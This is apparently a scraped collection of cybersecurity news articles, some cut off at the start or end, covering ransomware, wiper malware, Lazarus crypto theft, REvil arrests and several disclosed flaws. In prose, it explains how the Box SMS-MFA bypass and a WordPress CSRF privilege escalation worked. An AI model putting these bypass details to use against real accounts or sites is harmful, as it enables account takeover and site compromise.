We’ve seen this pattern consistently in our leak-threats data over the last two years, by industry, country, and actor.\nThe most obvious explanation for this pattern is again that criminals are attacking indiscriminately, but that there are more small businesses in the world. Small businesses are also likely to have fewer skills and technical resources with which to defend themselves or recover from attacks.\nThis suggests again that any and every business can expect to be targeted, and that the primary deciding factor of becoming a leak site victim is the ability of the business to withstand attack and recover from compromise.\nIt’s worth also noting that, since the crime we’re investigating here is extortion, and not theft, it is the value of the impacted digital asset to the victim that concerns us, not the value of the data to the criminal.\nAny business that has digital assets of value can therefore be a victim. Neither small size nor the perceived ’irrelevance’ of data will offer significant protection or ’fly under the radar’.\nThis is just an excerpt of the analysis. More details like the threat actors identified or the industries targeted most (as well as a ton of other interesting research topics) can be found in the Security Navigator. It’s available for download on the Orange Cyberdefense website, so have a look.

'text': 'Potential connections between a subscription-based crimeware-as-a-service (CaaS) solution and a cracked copy of Cobalt Strike have been established in what the researchers suspect is being offered as a tool for its customers to stage post-exploitation activities.\nPrometheus, as the service is called, first came to light in August 2021 when cybersecurity company Group-IB disclosed details of malicious software distribution campaigns undertaken by cybercriminal groups to distribute Campo Loader, Hancitor, IcedID, QBot, Buer Loader, and SocGholish in Belgium and the U.S.\nCosting $250 a month, it’s marketed on Russian underground forums as a traffic direction system (TDS) to enable phishing redirection on a mass scale to rogue landing pages that are designed to deploy malware payloads on the targeted systems.\n\n“Prometheus can be considered a full-bodied service/platform that allows threat groups to purvey their malware or phishing operations with ease,“ BlackBerry Research and Intelligence Team said in a report shared with The Hacker News. “The main components of Prometheus include a web of malicious infrastructure, malicious email distribution, illicit file-hosting through legitimate services, traffic redirection and the ability to deliver malicious files.“\nTypically, the redirection is funneled from one of two main sources, namely with the help of malicious ads (aka malvertising) on legitimate websites, or via websites that have been tampered to insert malicious code.\nIn the case of Prometheus, the attack chain starts with a spam email containing a HTML file or a Google Docs page that, upon interaction, redirects the victim to a compromised website hosting a PHP backdoor that fingerprints the machine to determine whether “to serve the victim with malware or redirect them to another page that might contain a phishing scam.“\n\nEarliest activity connected to the operators of the service, who go by the name “Ma1n“ on hacking forums, is said to have commenced in October 2018, with the author linked to other illicit tools offering high quality redirects and PowerMTA kits for mailing to corporate mailboxes, before putting up Prometheus TDS for sale on September 22, 2020.\nThat’s not all. BlackBerry also found overlaps between Prometheus-related activity and an illegitimate version of the Cobalt Strike adversary simulation and threat emulation software, raising the possibility that the copy is being “proliferated by the Prometheus operators themselves.“\n\n“It’s possible that someone connected with the Prometheus TDS is maintaining this cracked copy and providing it upon purchase,“ the researchers said. “It is also possible that this cracked installation may be provided as part of a standard playbook or a virtual machine (VM) installation.“\nThis is substantiated by the fact that a number of threat actors, including DarkCrystal RAT, FickerStealer, FIN7, Qakbot, and IceID, as well as ransomware cartels such as REvil, Ryuk (Wizard Spider), BlackMatter, and Cerber, have used the cracked copy in question over the last two years.\n\nOn top of that, the same Cobalt Strike Beacon has also been observed in conjunction with activities associated with an initial access broker tracked as Zebra2104, whose services have been put to use by groups like StrongPity, MountLocker, and Phobos for their own campaigns.\n“While TDS’es aren’t a new concept, the level of complexity, support and low financial cost adds credence to the theory that this is a trend that is likely to rise in the threat landscape’s near future,“ the researchers noted.\n“The volume of groups that are using offerings such as the Prometheus TDS, speak to the success and efficacy of these illicit infrastructure for hire services, which are in essence full-fledged enterprises that support the malicious activities of groups regardless of their size, level of resourcing or motives.“\n\n\n\n\n\n\n\nFound this article interesting?

{'title': 'Cyber Threat Protection — It All Starts with Visibility',
'text': 'Just as animals use their senses to detect danger, cybersecurity depends on sensors to identify signals in the computing environment that may signal danger. The more highly tuned, diverse and coordinated the senses, the more likely one is to detect important signals that indicate danger.\nThis, however, can be a double-edged sword. Too many signals with too little advanced signal processing just leads to a lot of noise. The right, diverse set of signals with highly evolved signal processing leads to survival. It therefore makes sense that broad threat visibility across the IT environment is fundamental for detecting cyberattacks. Cybersecurity company Cynet puts this in perspective in a new eBook, The Guide for Threat Visibility for Lean IT Security Teams – link to this.\nThe Ongoing Problem of Limited Threat Visibility\nThe complexity of today’s IT environments has made it exceedingly difficult to protect. The defensive perimeter has expanded with an expanded remote workforce, increasing SaaS and Cloud workloads and more liberal third-party access. The IT environment is so big and complex, and ever-changing, that monitoring what’s happening is almost imporssible.\nThis complexity is not lost on cybercriminals that are drooling over the expanding set of profitable opportunities to exploit, increasing the creation of new and unanticipated attack vectors. Because most security technologies excel at stopping known threats, the escalating number of new threats means more attacks are undetected.\nThe patchwork of security technologies strewn across the IT environment allow security practitioners to see some part of the attack surface, but certainly not all. Moreover, disconnected defenses cannot provide a complete and accurate assessment of the threat landscape. Rather than better focus, the hodgepodge of security technologies increases noise.\nThe bottom line is that poor visibility leads to inadequate defenses, overworked security teams and increasing costs. Improving threat visibility is the first step to improving all aspects of cybersecurity.\nThe Three Keys for Threat Visibility\nIf attaining full threat visibility were easy, we wouldn’t be discussing it. Up until recently, achieving comprehensive visibility was very expensive, overly complex and based on a very large and highly skilled security team. Today, achieving full threat visibility is accessible to even the leanest IT security teams by using the right approach. See the Cynet eBook [link] for a more detailed explanation.\nKey Technologies for Threat Visibility \nWhile more technologies may seem better, the key is choosing the right set of technologies that cover the most important parts of the IT environment. These include:\nNGAV – Fundamental endpoint protection based on known bad signatures and behaviors.EDR – To detect and prevent more complex endpoint threats that bypass NGAV solutions.NDR – To detect threats that have made their way into the network and so-called lateral movement.UBA – To detect unusual activity that could signal stolen credentials, a rogue insider, or bots.Deception – To uncover intrusions that have bypassed other detection technologiesSIEM – To mine the extensive log data generated by IT systems.SOAR – To automate and speed up threat mitigation efforts.\nIntegrate Everything for a 360 Degree View\nMultiple detection and prevention tools, as listed above, are required to begin to see across the entire IT environment. Implemented as stand-alone components, however, will still leave huge gaps in visibility. It also leads to so-called alert overload as each technology independently streams a steady flow of alerts that tend to overwhelm security teams.\nNewer XDR solutions are built to integrate real-time signals from multiple points of telemetry on a single platform. Bringing together NGAV, EDR, UBA, NDR and Deception under one umbrella extends the range and resolution of threat visibility. XDR can expose attacks from every direction no matter what evasive measures they take.\nAutomate Response Actions to Improve Reflexes\nSeeing a threat is one thing. Quickly and appropriately reacting to it is another. With improved threat visibility and accuracy, IT security teams – and especially lean teams – will need to react quickly to thwart identified threats.\nAutomation improves both speed and scale more than an army of security pros could–so long as it is integrated within the XDR. When both work together, all the signals and data collected by the constituent parts of the XDR feed into the automation engine to give it an enhanced understanding. That enables the automation to investigate the attack faster to determine its root cause and full impact. Then, based on what’s known about the attack, automation can orchestrate a playbook recommended for that attack, taking specific steps to neutralize the threat and mitigate the damage.\nFinal Thoughts\nSecurity stack need not continue to expand. Consolidating and integrating the key tools with emerging XDR technology enhances threat visibility, along with everything else. XDR allows any security team, even the leanest and greenest, to slash the false alarms, see the stealthiest attacks earlier and then automatically and instantly do something about it. \nDownload the guide here\n\n\nFound this article interesting?

{'title': 'FIN8 Hackers Spotted Using New ’White Rabbit’ Ransomware in Recent Attacks',
'text': 'The financially motivated FIN8 actor, in all likelihood, has resurfaced with a never-before-seen ransomware strain called “White Rabbit“ that was recently deployed against a local bank in the U.S. in December 2021.\nThat’s according to new findings published by Trend Micro, calling out the malware’s overlaps with Egregor, which was taken down by Ukrainian law enforcement authorities in February 2021.\n“One of the most notable aspects of White Rabbit’s attack is how its payload binary requires a specific command-line password to decrypt its internal configuration and proceed with its ransomware routine,“ the researchers noted. “This method of hiding malicious activity is a trick that the ransomware family Egregor uses to hide malware techniques from analysis.“\n\nEgregor, which commenced operations in September 2020 until its operations took a huge hit, is widely believed to be a reincarnation of Maze, which shut down its criminal enterprise later that year.\nBesides taking a leaf out of Egregor’s playbook, White Rabbit adheres to the double extortion scheme and is believed to have been delivered via Cobalt Strike, a post-exploitation framework that’s put to use by threat actors to reconnoiter, infiltrate, and drop malicious payloads into the affected system.\n\nDouble extortion, also known as pay-now-or-get-breached, refers to an increasingly popular ransomware strategy in which valuable data from the targets is exfiltrated prior to launching the encryption routine, followed by pressurizing the victims into paying up to prevent the stolen information from being published online.\nIndeed, the ransom note displayed after the completion of the encryption process warns the victim that their data will be published or sold once the four-day deadline to meet their demands elapses. “We will also send the data to all interested supervisory organizations and the media,“ the note adds.\n\nAlthough real-world attacks involving White Rabbit have gained attention only recently, digital forensic clues piecing together its trail point to a string of malicious activities commencing as early as July 2021.\nWhat’s more, analysis of the ransomware samples dating back to August 2021 shows that the malware is an updated version of the Sardonic backdoor, which Bitdefender described last year as an actively developed malware encountered in the aftermath of an unsuccessful attack targeting a financial institution in the U.S.\n“The exact relationship between the White Rabbit group and FIN8 is currently unknown,“ cybersecurity company Lodestone said, adding it found a “number of TTPs suggesting that White Rabbit, if operating independently of FIN8, has a close relationship with the more established threat group or is mimicking them.“\n“Given that FIN8 is known mostly for its infiltration and reconnaissance tools, the connection could be an indication of how the group is expanding its arsenal to include ransomware,“ Trend Micro said. “So far, White Rabbit’s targets have been few, which could mean that they are still testing the waters or warming up for a large-scale attack.“\n\n\nFound this article interesting?

'text': 'An IRC (Internet Relay Chat) bot strain programmed in GoLang is being used to launch distributed denial-of-service (DDoS) attacks targeting users in Korea.\n“The malware is being distributed under the guise of adult games,“ researchers from AhnLab’s Security Emergency-response Center (ASEC) said in a new report published on Wednesday. “Additionally, the DDoS malware was installed via downloader and UDP RAT was used.“\n\nThe attack works by uploading the malware-laced games to webhards — which refers to a web hard drive or a remote file hosting service — in the form of compressed ZIP archives that, when opened, includes an executable (“Game_Open.exe“) that’s orchestrated to run a malware payload aside from launching the actual game.\n\nThis payload, a GoLang-based downloader, establishes connections with a remote command-and-control (C&C) server to retrieve additional malware, including an IRC bot that can perform DDoS attacks.\n\n“It is also a type of DDoS Bot malware, but it uses IRC protocols to communicate with the C&C server,“ the researchers detailed. “Unlike UDP Rat that only supported UDP Flooding attacks, it can also support attacks such as Slowloris, Goldeneye, and Hulk DDoS.“\n\nGoLang’s low development difficulties and its cross-platform support have made the programming language a popular choice for threat actors, the researchers added.\n“The malware is being distributed actively via file sharing websites such as Korean webhards,“ AhnLab said. “As such, caution is advised when approaching executables downloaded from a file-sharing website.

'text': 'The coordinated cyberattacks targeting Ukrainian government websites and the deployment of a data-wiper malware called WhisperGate on select government systems are part of a broader wave of malicious activities aimed at sabotaging critical infrastructure in the country.\nThe Secret Service of Ukraine on Monday confirmed that the two incidents are related, adding the breaches also exploited the recently disclosed Log4j vulnerabilities to gain access to some of the compromised systems.\n\n“The attack used vulnerabilities in the site’s content management systems (October CMS) and Log4j, as well as compromised accounts of employees of the development company,“ the SSU said, corroborating prior disclosure from the Ukraine CERT team.\nThe disclosure comes days after Microsoft warned of a malware operation aimed at government, non-profit, and information technology entities in Ukraine, attributing the attacks to a threat cluster codenamed “DEV-0586.“\n“The attackers corrupted MBR records (the service information on the media required to access the data) on individual servers and user computers. Moreover, this applies to both operating systems running Windows and Linux.“\nThe Ukrainian Cyber Police, for its part, noted that it’s investigating a combination of three intrusion vectors that were likely used to pull off the attacks — supply chain attack targeting an IT firm which manages websites for the Ukrainian government, exploitation of the flaw in October CMS, and Log4j vulnerabilities.\n\nWhat’s more, the IT firm referenced by Microsoft, Kitsoft, confirmed on Facebook it had been hit with the WhisperGate malware. “The current situation is not just about hacking websites, it is an attack aimed at sowing panic and fear, destabilizing the country from within,“ the company said.\nWhile neither the Cyber Police nor the SSU attributed the defacements and the destructive malware attacks to any threat group or state-sponsored actor, the Ukrainian Ministry of Digital Transformation pointed fingers at Russia, accusing the country of trying to “wage a hybrid war.“\n\n\nFound this article interesting?

{'title': 'Researchers Bypass SMS-based Multi-Factor Authentication Protecting Box Accounts',
'text': 'Cybersecurity researchers have disclosed details of a now-patched bug in Box’s multi-factor authentication (MFA) mechanism that could be abused to completely sidestep SMS-based login verification.\n“Using this technique, an attacker could use stolen credentials to compromise an organization’s Box account and exfiltrate sensitive data without access to the victim’s phone,“ Varonis researchers said in a report shared with The Hacker News.\nThe cybersecurity company said it reported the issue to the cloud service provider on November 2, 2021, post which fixes were issued by Box.\n\nMFA is an authentication method that relies on a combination of factors such as a password (something only the user knows) and a temporary one-time password aka TOTP (something only the user has) to provide users a second layer of defense against credential stuffing and other account takeover attacks.\nThis two-step authentication can either involve sending the code as an SMS or alternatively, accessed via an authenticator app or a hardware security key. Thus, when a Box user who is enrolled for SMS verification logs in with a valid username and password, the service sets a session cookie and redirects the user to a page where the TOTP can be entered to gain access to the account.\n\nThe bypass identified by Varonis is a consequence of what the researchers called a mixup of MFA modes. It occurs when an attacker signs in with the victim’s credentials and abandons the SMS-based authentication in favor of a different process that uses, say, the authenticator app to successfully complete the login simply by furnishing the TOTP associated with their own Box account.\n“Box misses that the victim hasn’t enrolled [in] an authenticator app, and instead blindly accepts a valid authentication passcode from a totally different account without first checking that it belonged to the user that was logging in,“ the researchers said. “This made it possible to access the victim’s Box account without accessing their phone or notifying the user via SMS.“\nPut differently, Box not only did not check whether the victim was enrolled in an authenticator app-based verification (or any other method barring SMS), it also did not validate that the code entered is from an authenticator app that’s actually linked to the victim who is attempting to log in.\n\nThe findings come a little over a month after Varonis disclosed a similar technique that could enable malicious actors to get around authenticator-based verification by “unenroll[ing] a user from MFA after providing a username and password but before providing the second factor.“\n“The /mfa/unenrollment endpoint did not require the user to be fully authenticated in order to remove a TOTP device from a user’s account,“ the researchers noted in early December 2021.\n“MFA is only as good as the developer writing the code [and] can provide a false sense of security,“ the researchers concluded. “Just because MFA is enabled doesn’t necessarily mean an attacker must gain physical access to a victim’s device to compromise their account.“\n\n\nFound this article interesting?

However, in recent years, it has become one of the preferred tools in a threat actor’s arsenal and the primary means of turning a foothold into a hands-on intrusion.\nInterestingly, while the attacks also involve installing cryptocurrency miners on infected hosts, the researchers pointed out that “the revenue earned from the mining activities seem low.“\n\nTelemetry data gathered by Trend Micro reveal that Earth Lusca staged attacks against entities that could be of strategic interest to the Chinese government, including —\nGambling companies in Mainland ChinaGovernment institutions in Taiwan, Thailand, Philippines, Vietnam, United Arab Emirates, Mongolia, and NigeriaEducational institutions in Taiwan, Hong Kong, Japan, and FranceNews media in Taiwan, Hong Kong, Australia, Germany, and FrancePro-democracy and human rights political organizations and movements in Hong KongCOVID-19 research organizations in the U.S.Telecom companies in NepalReligious movements that are banned in Mainland China, andVarious cryptocurrency trading platforms\n“Evidence points to Earth Lusca being a highly-skilled and dangerous threat actor mainly motivated by cyberespionage and financial gain.

'text': 'Google Chrome has announced plans to prohibit public websites from directly accessing endpoints located within private networks as part of an upcoming major security shakeup to prevent intrusions via the browser.\nThe proposed change is set to be rolled out in two phases consisting of releases Chrome 98 and Chrome 101 scheduled in the coming months via a newly implemented W3C specification called private network access (PNA).\n\n“Chrome will start sending a CORS preflight request ahead of any private network request for a subresource, which asks for explicit permission from the target server,“ Titouan Rigoudy and Eiji Kitamura said. “This preflight request will carry a new header, Access-Control-Request-Private-Network: true, and the response to it must carry a corresponding header, Access-Control-Allow-Private-Network: true.“\n\nWhat this means is that starting with Chrome version 101, any website accessible via the internet will be made to seek explicit permission from the browser before they can access internal network resources. In other words, the new PNA specification adds a provision inside the browser through which websites can request servers gated behind local networks to obtain a connection.\n“The specification also extends the Cross-Origin Resource Sharing (CORS) protocol so that websites now have to explicitly request a grant from servers on private networks before being allowed to send arbitrary requests,“ Rigoudy noted in August 2021, when Google first announced plans to deprecate access to private network endpoints from non-secure websites.\n\nThe goal, the researchers said, is to safeguard users from cross-site request forgery (CSRF) attacks targeting routers and other devices on private networks, which enable bad actors to reroute unsuspecting users to malicious domains.\nIt’s not just Chrome. Microsoft’s Chromium-based Edge browser has added a new browsing mode to the Beta channel (Version 98.0.1108.23) that aims to bring an added layer of security to mitigate future in-the-wild exploitation of unknown zero-day vulnerabilities.\n“This feature is a huge step forward because it lets us mitigate unforeseen active zero days (based on historical trends),“ Microsoft said. “When turned on, this feature brings Hardware-enforced Stack Protection, Arbitrary Code Guard (ACG), and Content Flow Guard (CFG) as supporting security mitigations to increase users’ security on the web.“\n\n\nFound this article interesting?

This was followed by Monopoly Market, which became inaccessible early this month in what’s suspected to be an exit scam.\nThat said, the illicit market for stolen credit card data has become so lucrative that sales have surpassed 1.4 billion just in Bitcoin, paving the way for new entrants to the space that tend to swiftly fill the vacuum left by defunct criminal entities in a manner that mirrors the ever-evolving ransomware landscape.\n\nThe most notable of the lot has been All World Cards, which emerged on the scene in May 2021 and has since drummed up attention by leaking data for one million credit cards plundered between 2018 and 2019 on a cybercrime forum for free, with most cards from the State Bank of India, Banco Santander, and Sutton Bank.\n“The wave of recent departures has potentially been a trigger for UniCC’s retirement, as illicit actors see an opportunity in the turbulence to either run away with users’ funds or retire to avoid increased law enforcement attention,“ the researchers said.\n\n\nFound this article interesting?

'text': 'Researchers have disclosed a security shortcoming affecting three different WordPress plugins that impact over 84,000 websites and could be abused by a malicious actor to take over vulnerable sites.\n“This flaw made it possible for an attacker to update arbitrary site options on a vulnerable site, provided they could trick a site’s administrator into performing an action, such as clicking on a link,“ WordPress security company Wordfence said in a report published last week.\n\nTracked as CVE-2022-0215, the cross-site request forgery (CSRF) flaw is rated 8.8 on the CVSS scale and impacts three plugins maintained by Xootix —\nLogin/Signup Popup (Inline Form + Woocommerce),Side Cart Woocommerce (Ajax), andWaitlist Woocommerce (Back in stock notifier)\nCross-site request forgery, also known as one-click attack or session riding, occurs when an authenticated end-user is tricked by an attacker into submitting a specially crafted web request. “If the victim is an administrative account, CSRF can compromise the entire web application,“ OWASP notes in its documentation.\n\nSpecifically, the vulnerability has its origin in a lack of validation when processing AJAX requests, effectively enabling an attacker to update the “users_can_register“ (i.e., anyone can register) option on a site to true and set the “default_role“ setting (i.e., the default role of users who register at the blog) to administrator, granting complete control.\nLogin/Signup Popup is installed on over 20,000 sites, while Side Cart Woocommerce and Waitlist Woocommerce have been installed on more than 4,000 and 60,000 sites, respectively.\n\nFollowing responsible disclosure by Wordfence researchers in November 2021, the issue has been addressed in Login/Signup Popup version 2.3, Side Cart Woocommerce version 2.1, and Waitlist Woocommerce version 2.5.2.\nThe findings come a little over a month after attackers exploited weaknesses in four plugins and 15 Epsilon Framework themes to target 1.6 million WordPress sites as part of a large-scale attack campaign originating from 16,000 IP addresses.\n“Though this Cross-Site Request Forgery (CSRF) vulnerability is less likely to be exploited due to the fact that it requires administrator interaction, it can have a significant impact to a successfully exploited site and, as such, it serves as an incredibly important reminder to remain aware when clicking on links or attachments and to ensure that you are regularly keeping your plugins and themes up to date,“ Wordfence’s Chloe Chamberland said.\n\n\nFound this article interesting?

{'title': 'New Unpatched Apple Safari Browser Bug Allows Cross-Site User Tracking',
'text': 'A software bug introduced in Apple Safari 15’s implementation of the IndexedDB API could be abused by a malicious website to track users’ online activity in the web browser and worse, even reveal their identity.\nThe vulnerability, dubbed IndexedDB Leaks, was disclosed by fraud protection software company FingerprintJS, which reported the issue to the iPhone maker on November 28, 2021.\nIndexedDB is a low-level JavaScript application programming interface (API) provided by web browsers for managing a NoSQL database of structured data objects such as files and blobs.\n\n“Like most web storage solutions, IndexedDB follows a same-origin policy,“ Mozilla notes in its documentation of the API. “So while you can access stored data within a domain, you cannot access data across different domains.“\nSame-origin is a fundamental security mechanism that ensures that resources retrieved from distinct origins — i.e., a combination of the scheme (protocol), host (domain), and port number of a URL — are isolated from each other. This effectively means that “http[:]//example[.]com/“ and “https[:]//example[.]com/“ are not of the same origin because they use different schemes.\nBy restricting how a script loaded by one origin can interact with a resource from another origin, the idea is to sequester potentially malicious scripts and reduce potential attack vectors by preventing a rogue website from running arbitrary JavaScript code to read data from another domain, say, an email service.\n\nBut that’s not the case with how Safari handles the IndexedDB API in Safari across iOS, iPadOS, and macOS.\n“In Safari 15 on macOS, and in all browsers on iOS and iPadOS 15, the IndexedDB API is violating the same-origin policy,“ Martin Bajanik said in a write-up. “Every time a website interacts with a database, a new (empty) database with the same name is created in all other active frames, tabs, and windows within the same browser session.“\n\nA consequence of this privacy violation is that it allows websites to learn what other websites a user is visiting in different tabs or windows, not to mention precisely identify users on Google services services like YouTube and Google Calendar as these websites create IndexedDB databases that include the authenticated Google User IDs, which is an internal identifier that uniquely identifies a single Google account.\n“Not only does this imply that untrusted or malicious websites can learn a user’s identity, but it also allows the linking together of multiple separate accounts used by the same user,“ Bajanik said.\n\nTo make matters worse, the leakage also affects Private Browsing mode in Safari 15 should a user visit multiple different websites from within the same tab in the browser window. We have reached out to Apple for further comment, and we’ll update the story if we hear back.\n“This is a huge bug,“ Jake Archibald, developer advocate for Google Chrome, tweeted. “On OSX, Safari users can (temporarily) switch to another browser to avoid their data leaking across origins. iOS users have no such choice, because Apple imposes a ban on other browser engines.“\n\n\nFound this article interesting?

{'title': 'A New Destructive Malware Targeting Ukrainian Government and Business Entities',
'text': 'Cybersecurity teams from Microsoft on Saturday disclosed they identified evidence of a new destructive malware operation dubbed “WhisperGate“ targeting government, non-profit, and information technology entities in Ukraine amid brewing geopolitical tensions between the country and Russia.\n“The malware is disguised as ransomware but, if activated by the attacker, would render the infected computer system inoperable,“ Tom Burt, corporate vice president of customer security and trust at Microsoft, said, adding the intrusions were aimed at government agencies that provide critical executive branch or emergency response functions.\nAlso among those affected by the malware is an IT firm that “manages websites for public and private sector clients, including government agencies whose websites were recently defaced,“ Burt noted.\n\nThe computing giant, which first detected the malware on January 13, attributed the attacks to an emerging threat cluster codenamed “DEV-0586,“ with no observed overlaps in tactics and procedures to other previously documented groups. It further said the malware was found on dozens of impacted systems, a number it expects to increase as the investigation continues.\nAccording to Microsoft Threat Intelligence Center (MSTIC) and Microsoft Digital Security Unit (DSU), the attack chain is a two-stage process that entails —\nOverwriting the Master Boot Record (MBR) — the first sector of any hard disk that identifies where the operating system is located in the disk so that it can be loaded into a computer’s RAM — on a victim’s system to display a fake ransom note urging the target to pay an amount of $10,000 to a bitcoin walletA second-stage executable that retrieves a file corrupter malware hosted on a Discord channel that’s designed to search for files with 189 different extensions, then irrevocably overwrite their contents with a fixed number of 0xCC bytes and rename each file with a seemingly random four-byte extension.\nThe malicious activity is “inconsistent“ with cybercriminal ransomware activity for reasons that “explicit payment amounts and cryptocurrency wallet addresses are rarely specified in modern criminal ransom notes“ and “the ransom note in this case does not include a custom ID,“ Microsoft said.\n\nThe development comes as numerous government websites in the Eastern European country were defaced on Friday with a message warning Ukrainians that their personal data was being uploaded to the Internet. The Security Service of Ukraine (SSU) said it found “signs“ of involvement of hacking groups associated with the Russian intelligence services.\n“Given the scale of the observed intrusions, MSTIC is not able to assess intent of the identified destructive actions but does believe these actions represent an elevated risk to any government agency, non-profit or enterprise located or with systems in Ukraine,“ the researchers cautioned. \nHowever, Reuters earlier today raised the possibility that the attacks may have been the work of an espionage group linked to Belarusian intelligence that’s tracked as UNC1151 and Ghostwriter. “Multiple significant intrusions into Ukrainian government entities have been conducted by UNC1151,“ cybersecurity firm Mandiant disclosed in a report in November 2021, pointing out the group’s operations as those aligned with Belarusian government interests.\n\n\nFound this article interesting?

'text': 'In an unprecedented move, Russia’s Federal Security Service (FSB), the country’s principal security agency, on Friday disclosed that it arrested several members belonging to the notorious REvil ransomware gang and neutralized its operations.\nThe surprise takedown, which it said was carried out at the request of the U.S. authorities, saw the law enforcement agency conduct raids at 25 addresses in the cities of Moscow, St. Petersburg, Moscow, Leningrad and Lipetsk regions that belonged to 14 suspected members of the organized cybercrime syndicate.\n“In order to implement the criminal plan, these persons developed malicious software, organized the theft of funds from the bank accounts of foreign citizens and their cashing, including through the purchase of expensive goods on the Internet,“ the FSB said in a statement.\n\nIn addition, the FSB seized over 426 million rubles, including in cryptocurrency, $600,000, €500,000, as well as computer equipment, crypto wallets used to commit crimes, and 20 luxury cars that were purchased with money obtained by illicit means.\nOne of the most active ransomware crews last year, REvil took responsibility for high-profile attacks against JBS and Kaseya, among a string of several others. The U.S. government told Reuters that one of the arrested individuals was also behind the ransomware attack on Colonial Pipeline in May 2021, once again confirming REvil’s connections to a second collective called DarkSide.\n\nThe group formally closed shop in October 2021 after the U.S. intervened to take its network of dark web servers offline. The next month, law enforcement authorities announced the arrest of seven individuals for their roles as affiliates of the REvil ransomware family, even as the U.S. charged a 22-year-old Ukrainian citizen linked to the ransomware gang for orchestrating the Kaseya ransomware attack.\nAll those detained have been charged with “illegal circulation of means of payment,“ a criminal offense punishable by up to six years in prison. The suspects weren’t named, but Reuters noted that a Moscow court identified two of the men as Roman Muromsky and Andrei Bessonov.\n\nThe crackdown also comes as threat actors likely affiliated with Russian secret services crippled much of the Ukrainian government’s public-facing digital infrastructure, in addition to defacing some of them with messages that alleged people’s personal data had been made public and that the information stored in the servers was being destroyed.\nIt remains to be what impact the arrests will have on the larger ransomware ecosystem, which has by and large continued to flourish despite a number of law enforcement actions, partly driven by Russia’s willingness to look the other way when it comes to harboring cybercriminals in the country, effectively allowing the bad actors to operate with impunity.\n“While we are still looking to understand the true impact of these arrests, we applaud the Russian government for the actions it took today with regard to the REvil criminal ransomware group,“ Matt Olney, director of threat intelligence and interdiction at Cisco Talos, told The Hacker News. “It’s important that criminal cyber actors and organizations not be allowed to operate with impunity. And so any result that leads to degrading of their capabilities is undoubtedly a good thing.“\n\n\nFound this article interesting?

{'title': 'North Korean Hackers Stole Millions from Cryptocurrency Startups Worldwide',
'text': 'Operators associated with the Lazarus sub-group BlueNoroff have been linked to a series of cyberattacks targeting small and medium-sized companies worldwide with an aim to drain their cryptocurrency funds, in what’s yet another financially motivated operation mounted by the prolific North Korean state-sponsored actor.\nRussian cybersecurity company Kaspersky, which is tracking the intrusions under the name “SnatchCrypto,“ noted that the campaign has been running since at 2017, adding the attacks are aimed at startups in the FinTech sector located in China, Hong Kong, India, Poland, Russia, Singapore, Slovenia, the Czech Republic, the U.A.E., the U.S., Ukraine, and Vietnam.\n“The attackers have been subtly abusing the trust of the employees working at targeted companies by sending them a full-featured Windows backdoor with surveillance functions, disguised as a contract or another business file,“ the researchers said. “In order to eventually empty the victim’s crypto wallet, the actor has developed extensive and dangerous resources: complex infrastructure, exploits and malware implants.“\n\nBlueNoroff, and the larger Lazarus umbrella, are known for deploying a diverse arsenal of malware for a multi-pronged assault on businesses to illicitly procure funds, including relying on a mix of advanced phishing tactics and sophisticated malware, for the sanctions-hit North Korean regime and generate revenue for its nuclear weapons and ballistic missile programs.\nIf anything, these cyber offensives are paying off big time. According to a new report published by blockchain analytics firm Chainalysis, the Lazarus Group has been linked to seven attacks on cryptocurrency platforms that extracted almost $400 million worth of digital assets in 2021 alone, up from $300 million in 2020.\n\n“These attacks targeted primarily investment firms and centralized exchanges […] to siphon funds out of these organizations’ internet-connected ’hot’ wallets into DPRK-controlled addresses,“ the researchers said. “Once North Korea gained custody of the funds, they began a careful laundering process to cover up and cash out“ through mixers to obscure the trail.\nDocumented malicious activity involving the nation-state actor have take the form of cyber-enabled heists against foreign financial institutions, notably the SWIFT banking network hacks in 2015-2016, with recent campaigns resulting in the deployment of a backdoor called AppleJeus that poses as a cryptocurrency trading platform to plunder and transfer money to their accounts.\n\nThe SnatchCrypto attacks are no different in that they are part of the actor’s efforts focused on “stalking and studying“ cryptocurrency firms by concocting elaborate social engineering schemes to build trust with their targets by posing as legitimate venture capitalist firms, only to bait the victims into opening malware-laced documents that retrieve a payload designed to run a malicious executable received over an encrypted channel from a remote server.\n\nAn alternative method used to trigger the infection chain is the use of Windows shortcut files (“.LNK“) to fetch the next-stage malware, a Visual Basic Script, that then acts a jump off point to execute a series of intermediary payloads, before installing a full-featured backdoor that comes with “enriched“ capabilities to capture screenshots, record keystrokes, steal data from Chrome browser, and execute arbitrary commands.\n\nThe ultimate goal of the attacks, however, is to monitor financial transactions of the compromised users and steal cryptocurrency. Should a potential target use a Chrome extension like Metamask to manage crypto wallets, the adversary stealthily moves to locally replace the main component of the extension with a fake version that alerts the operators every time a large transfer is kicked off to another account.\nIn the final phase, the funds are subsequently diverted by performing a malicious code injection to intercept and modify the transaction details on demand. “The attackers modify not only the recipient [wallet] address, but also push the amount of currency to the limit, essentially draining the account in one move,“ the researchers explained.\n“Cryptocurrency is a heavily targeted sector when it comes to cybercrime due to the decentralized nature of the currencies and the fact that, unlike with credit card or bank transfers, the transaction happens quickly and is impossible to reverse,“ Erich Kron, security awareness advocate at KnowBe4, said in a statement.\n“Nation-states, especially those under strict tariffs or other financial restrictions, can benefit greatly by stealing and manipulating cryptocurrency. Many times, a cryptocurrency wallet can contain multiple types of cryptocurrency, making them a very appealing target,“ Kron added.\n\n\nFound this article interesting?

Officials said a total of 27 compromising images and videos of children were found on his computer, with over 30 victims identified over the course of the investigation.\nFurthermore, Davies has been determined as a customer of a now-defunct marketplace called WeLeakInfo, which pawned access to data gathered from other websites until its disruption in January 2020. Later that year, the NCA arrested 21 individuals across the country for using the stolen personal credentials to commit further cyber and fraud offences.\n\nDavies, who was arrested thrice between November 2019 and August 2021, now faces a jailterm of 26 months on charges of computer misuse, voyeurism, owning indecent images of children (IIOC), and for making IIOC and possessing extreme pornographic images. He has also been placed on the sex offenders’ register and given a 10-year restraining order on five of the victims along with a 10-year sexual harm prevention order.\n“Davies had amassed what can only be described as a cyber criminal’s toolkit,“ Andrew Shorrock of the NCA’s National Cyber Crime Unit said. “Not only was he using these tools to break in to peoples’ devices, he was using them to spy on his unsuspecting victims and to steal naked images of them for his own sexual gratification.“\n\n\nFound this article interesting?

